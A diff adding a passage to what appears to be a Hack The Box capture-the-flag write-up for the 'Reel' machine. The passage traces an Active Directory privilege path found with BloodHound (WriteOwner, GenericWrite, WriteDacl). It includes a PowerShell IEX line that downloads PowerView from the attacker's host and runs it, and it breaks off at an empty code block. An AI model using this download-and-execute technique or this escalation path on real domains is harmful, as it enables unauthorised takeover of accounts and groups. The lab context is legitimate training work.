@@ -241,3 +241,28 @@ If we execute the function in SharpHound with the parameters that it should coll
 Invoke-Bloodhound -CollectionMethod All
 ```
 
+Now the same query as last time has a lot more information:
+![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/Image2.png)
+
+If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we get see that Nico has _WriteOwner_ permissions **to Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
+![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/Image3.png)
+
+All Active Directory privileges are explained on [ADSecurity.org](https://adsecurity.org/?p=3658).
+
+- WriteOwner: Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object
+- GenericWrite: Provides write access to all properties
+- WriteDACL: Provides the ability to modify security on an object which can lead to Full Control of the object
+
+This means we can take ownership with Nico of the Herman account and change his password for example and with that user we can take full control over the Backup_Admins group.
+
+### Exploiting Active Directory
+
+To exploit that permissions in AD we start the script **PoverView.ps1** from the **PowerSploit** script collection framework which you can find in Tom desktop folder, but I am going to upload it from my local machine.
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/PowerView.ps1')
+```
+
+Taking ownership of Herman:
+```powershell
+
+```
